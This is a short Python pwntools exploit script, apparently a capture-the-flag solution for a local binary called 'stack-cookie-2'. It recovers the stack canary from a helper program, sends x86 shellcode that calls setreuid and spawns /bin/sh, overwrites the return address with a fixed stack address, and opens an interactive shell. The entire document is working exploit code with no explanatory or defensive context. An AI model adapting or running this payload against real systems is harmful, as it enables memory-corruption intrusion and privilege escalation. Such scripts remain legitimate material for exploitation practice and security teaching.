#!/usr/bin/env python

from pwn import *
from subprocess import call

p = process('./stack-cookie-2')
r = process('./rand')
cookie = r.recv()
cookie = int(cookie)

shellcode = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc9\x89\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80'
buf = shellcode + "A" * (0x84 - len(shellcode)) + p32(cookie) + "AAAA" + p32(0xffffd450)

p.sendline(buf)

print(p.recv())

p.interactive()
